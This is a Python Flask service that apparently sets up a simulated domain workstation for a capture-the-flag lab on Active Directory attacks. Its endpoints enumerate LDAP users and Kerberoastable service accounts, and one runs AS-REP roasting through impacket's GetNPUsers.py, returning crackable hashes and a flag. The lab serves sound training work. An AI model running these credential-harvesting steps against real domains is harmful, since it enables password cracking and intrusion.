#!/usr/bin/env python3
"""
Workstation Service - Simulates a domain-joined workstation
Provides an entry point for attackers with tools pre-installed
"""

from flask import Flask, jsonify, request
import subprocess
import os

app = Flask(__name__)

FLAG_ASREP = os.getenv('FLAG_ASREP', 'S7BEN{asrep_roast_no_preauth_f3e8a1c7b9d2e6f5}')

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({"status": "healthy", "service": "workstation"})

@app.route('/api/info')
def info():
    """Workstation information"""
    return jsonify({
        "hostname": "ws01.corp.local",
        "domain": "CORP.LOCAL",
        "os": "Ubuntu 22.04",
        "role": "Domain Workstation",
        "tools_installed": [
            "impacket",
            "ldap-utils",
            "krb5-user"
        ]
    })

@app.route('/api/domain/users')
def enumerate_users():
    """
    Enumerate domain users via LDAP
    Simulates what an attacker would do on a domain workstation
    """
    try:
        cmd = [
            'ldapsearch',
            '-x',
            '-H', 'ldap://dc.corp.local:389',
            '-b', 'dc=corp,dc=local',
            '(objectClass=inetOrgPerson)',
            'uid', 'cn', 'mail', 'servicePrincipalName'
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

        if result.returncode == 0:
            # Parse LDAP output
            users = []
            current_user = {}

            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('dn:'):
                    if current_user:
                        users.append(current_user)
                    current_user = {'dn': line.split(':', 1)[1].strip()}
                elif line.startswith('uid:'):
                    current_user['username'] = line.split(':', 1)[1].strip()
                elif line.startswith('cn:'):
                    current_user['name'] = line.split(':', 1)[1].strip()
                elif line.startswith('servicePrincipalName:'):
                    if 'spns' not in current_user:
                        current_user['spns'] = []
                    current_user['spns'].append(line.split(':', 1)[1].strip())

            if current_user:
                users.append(current_user)

            return jsonify({
                "message": "Domain users enumerated successfully",
                "users": users,
                "count": len(users)
            })
        else:
            return jsonify({
                "error": "LDAP enumeration failed",
                "details": result.stderr
            }), 500

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/domain/spns')
def enumerate_spns():
    """
    Enumerate Service Principal Names (Kerberoasting targets)
    """
    try:
        cmd = [
            'ldapsearch',
            '-x',
            '-H', 'ldap://dc.corp.local:389',
            '-b', 'dc=corp,dc=local',
            '(servicePrincipalName=*)',
            'uid', 'servicePrincipalName'
        ]

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

        if result.returncode == 0:
            spns = []
            current_entry = {}

            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('uid:'):
                    current_entry['account'] = line.split(':', 1)[1].strip()
                elif line.startswith('servicePrincipalName:'):
                    current_entry['spn'] = line.split(':', 1)[1].strip()
                    spns.append(current_entry.copy())

            return jsonify({
                "message": "Service accounts with SPNs found",
                "spns": spns
            })
        else:
            return jsonify({"error": result.stderr}), 500

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/kerberos/asrep-roast', methods=['POST'])
def asrep_roast():
    """
    Perform AS-REP roasting attack
    Targets users without Kerberos pre-authentication
    """
    data = request.get_json() or {}
    username = data.get('username', 'bob')

    try:
        # Use impacket's GetNPUsers.py
        cmd = [
            'GetNPUsers.py',
            'CORP.LOCAL/',
            '-usersfile', '/dev/stdin',
            '-dc-ip', 'dc.corp.local',
            '-format', 'hashcat'
        ]

        result = subprocess.run(
            cmd,
            input=username,
            capture_output=True,
            text=True,
            timeout=10
        )

        if 'krb5asrep' in result.stdout:
            return jsonify({
                "success": True,
                "message": f"Hash retrieved for {username}",
                "hash": result.stdout.strip(),
                "flag": FLAG_ASREP
            })
        else:
            return jsonify({
                "success": False,
                "message": f"User {username} requires pre-authentication or does not exist",
                "output": result.stdout + result.stderr
            })

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/kerberos/tgt', methods=['POST'])
def request_tgt():
    """
    Request a Kerberos TGT (Ticket Granting Ticket)
    Simulates kinit functionality
    """
    data = request.get_json()

    if not data or 'username' not in data or 'password' not in data:
        return jsonify({"error": "Username and password required"}), 400

    username = data['username']
    password = data['password']
    realm = data.get('realm', 'CORP.LOCAL')

    try:
        # Use kinit to get TGT
        principal = f"{username}@{realm}"
        cmd = ['kinit', principal]

        result = subprocess.run(
            cmd,
            input=password,
            capture_output=True,
            text=True,
            timeout=10
        )

        if result.returncode == 0:
            # Check ticket cache
            klist_result = subprocess.run(['klist'], capture_output=True, text=True)

            return jsonify({
                "success": True,
                "message": f"TGT obtained for {principal}",
                "ticket_cache": klist_result.stdout
            })
        else:
            return jsonify({
                "success": False,
                "error": "Authentication failed",
                "details": result.stderr
            }), 401

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/tools')
def list_tools():
    """List available system tools"""
    return jsonify({
        "tools": {
            "network": {
                "curl": "HTTP client",
                "wget": "File downloader",
                "nmap": "Network scanner"
            },
            "directory": {
                "ldapsearch": "Query LDAP directory",
                "ldapwhoami": "Verify LDAP authentication"
            },
            "auth": {
                "kinit": "Obtain Kerberos ticket",
                "klist": "List cached tickets",
                "kdestroy": "Destroy ticket cache"
            }
        }
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
